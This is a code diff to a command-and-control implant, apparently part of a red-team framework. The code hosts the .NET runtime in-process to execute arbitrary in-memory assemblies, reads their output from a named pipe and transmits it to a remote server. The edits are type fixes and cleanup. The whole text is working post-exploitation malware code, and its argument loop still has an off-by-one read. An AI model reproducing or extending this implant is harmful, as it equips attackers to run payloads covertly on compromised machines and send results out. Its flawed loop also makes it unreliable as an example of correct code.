@@ -20,8 +20,8 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     SAFEARRAYBOUND RgsBound[ 1 ]  = { 0 };
     BUFFER         AssemblyData   = { 0 };
     LPWSTR*        ArgumentsArray = NULL;
-    DWORD          ArgumentsCount = 0;
-    ULONG          idx[ 1 ]       = { 0 };
+    INT            ArgumentsCount = 0;
+    LONG           idx[ 1 ]       = { 0 };
     VARIANT        Object         = { 0 };
 
     if ( ! Assembly.Buffer || ! Assembly.Length )
@@ -114,7 +114,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     }
 
     PUTS( "QueryInterface..." )
-    if ( Instance.Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance.Dotnet->AppDomainThunk, &xIID_AppDomain, &Instance.Dotnet->AppDomain ) != S_OK )
+    if ( Instance.Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance.Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&Instance.Dotnet->AppDomain ) != S_OK )
     {
         PUTS( "QueryInterface Failed" )
         return FALSE;
@@ -158,7 +158,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     Instance.Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
     Instance.Dotnet->vtPsa.parray = Instance.Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );
 
-    for ( INT i = 0; i <= ArgumentsCount; i++ )
+    for ( LONG i = 0; i <= ArgumentsCount; i++ )
         Instance.Win32.SafeArrayPutElement( Instance.Dotnet->vtPsa.parray, &i, Instance.Win32.SysAllocString( ArgumentsArray[ i ] ) );
 
     Instance.Win32.SafeArrayPutElement( Instance.Dotnet->MethodArgs, idx, &Instance.Dotnet->vtPsa );
@@ -266,15 +266,14 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     } else PUTS( "NtCreateEvent failed" )
     */
 
-Leave:
     return TRUE;
 }
 
 /* push anything from the pipe */
 VOID DotnetPushPipe()
 {
-    PVOID Package = NULL;
-    DWORD Read    = 0;
+    DWORD Read      = 0;
+    DWORD BytesRead = 0;
 
     if ( ! Instance.Dotnet )
         return;
@@ -289,9 +288,10 @@ VOID DotnetPushPipe()
             Instance.Dotnet->Output.Length = Read;
             Instance.Dotnet->Output.Buffer = NtHeapAlloc( Instance.Dotnet->Output.Length );
 
-            Instance.Win32.ReadFile( Instance.Dotnet->Pipe, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length, &Instance.Dotnet->Output.Length, NULL );
+            Instance.Win32.ReadFile( Instance.Dotnet->Pipe, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length, &BytesRead, NULL );
+            Instance.Dotnet->Output.Length = BytesRead;
 
-            Package = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_OUTPUT );
+            PPACKAGE Package = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_OUTPUT );
             PackageAddBytes( Package, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length );
             PackageTransmit( Package, NULL, NULL );
 
@@ -313,9 +313,6 @@ VOID DotnetPush()
     PRINTF( "Instance.Dotnet->Invoked: %s\n", Instance.Dotnet->Invoked ? "TRUE" : "FALSE" )
     if ( Instance.Dotnet->Invoked )
     {
-        PVOID Package = NULL;
-        BOOL  Close   = FALSE;
-
         /* Read from the assembly named pipe and send it to the server */
         DotnetPushPipe();
 
@@ -491,14 +488,14 @@ DWORD ClrCreateInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PI
 {
     BOOL fLoadable = FALSE;
 
-    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, ppClrMetaHost ) == S_OK )
+    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost ) == S_OK )
     {
         if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
         {
             if ( ( ( *ppClrRuntimeInfo )->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable ) == S_OK ) && fLoadable )
             {
                 //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
-                if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, ppICorRuntimeHost ) == S_OK )
+                if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost ) == S_OK )
                 {
                     //Start it. This is okay to call even if the CLR is already running
                     ( *ppICorRuntimeHost )->lpVtbl->Start( *ppICorRuntimeHost );
